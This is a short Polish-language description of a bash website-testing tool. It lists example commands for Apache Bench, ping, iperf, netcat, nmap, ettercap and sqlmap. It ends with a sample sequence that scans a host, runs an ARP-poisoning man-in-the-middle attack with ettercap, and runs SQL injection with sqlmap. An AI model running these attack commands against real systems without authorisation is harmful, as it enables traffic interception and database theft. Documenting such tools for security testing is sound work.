Opis Programu:
Program jest narzędziem napisanym w języku bash, służącym do testowania stanu i bezpieczeństwa stron internetowych. Wykorzystuje popularne narzędzia takie jak Apache Bench, ping, iperf, nc, nmap, ettercap i sqlmap do przeprowadzania różnorodnych testów, takich jak test obciążenia, test ping, monitorowanie wydajności sieciowej, sprawdzanie dostępności portów, skanowanie podatności, atak typu Man-in-the-Middle oraz atak typu SQL injection.

Oto przykładowe komendy dla każdego z narzędzi używanych w programie:

1. **Apache Bench (ab)**:
   ```bash
   ab -n 100 -c 10 http://example.com/
   ```

2. **Ping**:
   ```bash
   ping -c 5 google.com
   ```

3. **Iperf**:
   ```bash
   iperf -c 192.168.1.100 -t 10 -i 1
   ```

4. **Netcat (nc)**:
   ```bash
   nc -zv example.com 80
   ```

5. **Nmap**:
   ```bash
   nmap -A 192.168.1.1
   ```

6. **Ettercap**:
   ```bash
   ettercap -TqM arp:remote /192.168.1.100/ //
   ```

7. **Sqlmap**:
   ```bash
   sqlmap -u "http://example.com/login.php?user=admin&password=123" --dbs
   ```

Oczywiście, oto przykład wykorzystania wszystkich narzędzi dla hosta "example.com":

1. Najpierw skanujemy podatności hosta "example.com" za pomocą Nmap:
```
nmap example.com
```

2. Następnie przeprowadzamy atak typu Man-in-the-Middle na hosta "example.com" za pomocą Ettercap:
```
ettercap -T -q -M arp:remote /example.com/ //
```

3. Po zakończeniu ataku możemy wykonać atak typu SQL injection na stronie internetowej "example.com" za pomocą SQLmap:
```
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

.